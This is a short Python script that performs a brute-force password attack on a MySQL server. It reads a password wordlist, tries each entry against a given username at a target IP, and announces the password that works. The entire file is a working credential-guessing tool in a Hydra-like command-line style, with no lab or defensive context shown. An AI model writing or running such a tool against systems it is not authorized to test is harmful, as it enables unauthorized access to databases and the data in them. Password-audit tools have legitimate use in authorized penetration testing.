import mysql.connector
import argparse
import sys
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def attempt_login(target_ip, username, password):
    """Attempts to log in to MySQL with the given credentials."""
    try:
        conn = mysql.connector.connect(
            host=target_ip,
            user=username,
            password=password,
            connect_timeout=3
        )
        conn.close()
        return True
    except mysql.connector.Error:
        return False

def bruteforce_mysql(target_ip, username, password_file):
    """Performs a brute-force attack on MySQL."""
    try:
        with open(password_file, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print(Fore.RED + "[!] Password file not found.")
        sys.exit(1)

    print(Fore.CYAN + f"[*] Starting brute-force attack on MySQL at {target_ip}...")

    for password in passwords:
        print(Fore.YELLOW + f'Trying Passphrase: "{password}"')
        if attempt_login(target_ip, username, password):
            print(Fore.GREEN + f'KEY FOUND: [ "{password}" ]')
            return

    print(Fore.RED + "KEY NOT FOUND")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MySQL Bruteforcer")
    parser.add_argument("-l", required=True, help="Username")
    parser.add_argument("-P", required=True, help="Path to password list")
    parser.add_argument("target", help="MySQL target IP (mysql://<target-ip>)")

    args = parser.parse_args()

    # Extract IP from "mysql://<target-ip>"
    if args.target.startswith("mysql://"):
        target_ip = args.target.replace("mysql://", "")
    else:
        print(Fore.RED + "[!] Invalid target format. Use mysql://<target-ip>")
        sys.exit(1)

    bruteforce_mysql(target_ip, args.l, args.P)